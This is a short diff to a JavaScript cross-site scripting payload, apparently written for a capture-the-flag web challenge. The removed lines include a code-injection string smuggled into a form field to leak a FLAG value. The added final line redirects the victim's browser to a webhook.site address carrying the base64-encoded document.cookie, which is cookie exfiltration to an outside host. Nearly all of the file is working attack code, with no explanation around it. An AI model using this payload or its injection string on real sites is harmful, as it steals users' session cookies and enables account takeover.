@@ -3,7 +3,7 @@ alert("injected");
 fetch("/report", {
   method: "POST",
   body: new URLSearchParams({
-    'id': '");res.locals.errormsg = FLAG;return;//'
+    'id': '1'
   }),
   headers: {
     "Content-Type": "application/x-www-form-urlencoded"
@@ -22,4 +22,4 @@ fetch("/report", {
   console.error('Fetch Error:', error);
 });
 
-//alert(document.cookie);
+window.location = "https://webhook.site/cc7513f7-4334-4f13-9bee-aab38c8a9ece?" + btoa(document.cookie);
